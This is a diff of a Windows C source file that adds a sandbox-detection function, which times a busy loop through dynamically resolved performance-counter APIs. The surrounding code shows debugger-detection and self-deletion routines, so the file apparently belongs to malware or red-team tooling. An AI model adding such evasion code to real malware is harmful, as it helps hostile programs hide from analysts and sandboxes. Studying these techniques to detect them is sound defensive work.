@@ -17,6 +17,35 @@ BOOL IsBeingDebugged() {
 	return FALSE;
 }
 
+BOOL DetectSandboxTiming() {
+	HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+	if (!hKernel32)
+		return FALSE;
+
+	typedef BOOL(WINAPI* QPFUNC)(LARGE_INTEGER*);
+	typedef BOOL(WINAPI* QPCFUNC)(LARGE_INTEGER*);
+
+	QPFUNC pQueryPerformanceFrequency = (QPFUNC)GetProcAddress(hKernel32, "QueryPerformanceFrequency");
+	QPCFUNC pQueryPerformanceCounter = (QPCFUNC)GetProcAddress(hKernel32, "QueryPerformanceCounter");
+
+	if (!pQueryPerformanceFrequency || !pQueryPerformanceCounter)
+		return FALSE;
+
+	LARGE_INTEGER freq, start, end;
+	pQueryPerformanceFrequency(&freq);
+	pQueryPerformanceCounter(&start);
+
+	for (volatile int i = 0; i < 100000; i++);
+
+	pQueryPerformanceCounter(&end);
+	double elapsed = (double)(end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
+
+	if (elapsed > 5.0) {
+		printf("[!] Timing anomaly detected (%.2f ms)\n", elapsed);
+		return TRUE;
+	}
+	return FALSE;
+}
 
 BOOL DeleteSelf() {
 		BOOL	bResult				 = FALSE;		
